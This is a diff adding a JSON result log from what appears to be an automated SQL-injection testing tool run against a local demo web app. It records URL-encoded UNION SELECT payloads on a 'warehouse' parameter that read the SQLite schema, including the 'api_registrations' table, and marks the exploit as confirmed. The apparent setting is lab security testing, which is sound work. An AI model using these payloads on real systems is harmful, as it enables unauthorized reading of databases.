@@ -1,0 +1,98 @@
+{
+ "status": "ok",
+ "claim": "exploited_confirmed",
+ "target": "c-demo-target",
+ "class": "sqli",
+ "path": "/reports/exception-queue",
+ "param": "warehouse",
+ "markers": [
+  "CREATE TABLE"
+ ],
+ "baseline": {
+  "n": 1,
+  "step": "library:01_schema_read.txt",
+  "value": "",
+  "status": 200,
+  "length": 2773,
+  "markers_hit": [],
+  "url": "http://127.0.0.1:8093/reports/exception-queue?%7B%7BWAREHOUSE_PARAM%7D%7D=%27%20UNION%20SELECT%20type%2Cname%2Csql%2Ctbl_name%2Crootpage%2C1%2C1%20FROM%20sqlite_master--%20",
+  "note": "库内载荷"
+ },
+ "anomalies": [],
+ "column_count": null,
+ "hit": {
+  "n": 3,
+  "step": "library:90_poc_120757b197fe.txt",
+  "value": "",
+  "status": 200,
+  "length": 2760,
+  "markers_hit": [
+   "CREATE TABLE"
+  ],
+  "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20type%2C%20name%2C%20sql%2C%20tbl_name%2C%20rootpage%2C%201%2C%201%20FROM%20sqlite_master%20WHERE%20name%3D%27api_registrations%27--%20",
+  "note": "库内载荷",
+  "poc_candidate_id": "sqli-88f5c8f30011",
+  "confirmed": true
+ },
+ "attempts": [
+  {
+   "n": 1,
+   "step": "library:01_schema_read.txt",
+   "value": "",
+   "status": 200,
+   "length": 2773,
+   "markers_hit": [],
+   "url": "http://127.0.0.1:8093/reports/exception-queue?%7B%7BWAREHOUSE_PARAM%7D%7D=%27%20UNION%20SELECT%20type%2Cname%2Csql%2Ctbl_name%2Crootpage%2C1%2C1%20FROM%20sqlite_master--%20",
+   "note": "库内载荷"
+  },
+  {
+   "n": 2,
+   "step": "library:02_schema_targeted.txt",
+   "value": "",
+   "status": 200,
+   "length": 2773,
+   "markers_hit": [],
+   "url": "http://127.0.0.1:8093/reports/exception-queue?%7B%7BWAREHOUSE_PARAM%7D%7D=SYN-DEP-11%27%20UNION%20SELECT%20type%2Cname%2Csql%2Ctbl_name%2Crootpage%2C1%2C1%20FROM%20sqlite_master%20WHERE%20name%3D%27api_registrations%27--%20",
+   "note": "库内载荷"
+  },
+  {
+   "n": 3,
+   "step": "library:90_poc_120757b197fe.txt",
+   "value": "",
+   "status": 200,
+   "length": 2760,
+   "markers_hit": [
+    "CREATE TABLE"
+   ],
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20type%2C%20name%2C%20sql%2C%20tbl_name%2C%20rootpage%2C%201%2C%201%20FROM%20sqlite_master%20WHERE%20name%3D%27api_registrations%27--%20",
+   "note": "库内载荷",
+   "poc_candidate_id": "sqli-88f5c8f30011",
+   "confirmed": true
+  }
+ ],
+ "budget": {
+  "requests_used": 3,
+  "requests_cap": 40,
+  "seconds_used": 0.21,
+  "seconds_cap": 120.0
+ },
+ "notes": [
+  "library_first_hit=90_poc_120757b197fe.txt",
+  "本轮命中来自 POC 库（上轮沉淀后被用上）"
+ ],
+ "queue": {
+  "total": 22,
+  "pending": 21,
+  "approved": 1,
+  "rejected": 0,
+  "duplicates": 0,
+  "by_evidence": {
+   "untried": 19,
+   "confirmed": 3
+  },
+  "by_source": {
+   "menu": 22
+  }
+ },
+ "library_hit": "90_poc_120757b197fe.txt"
+}
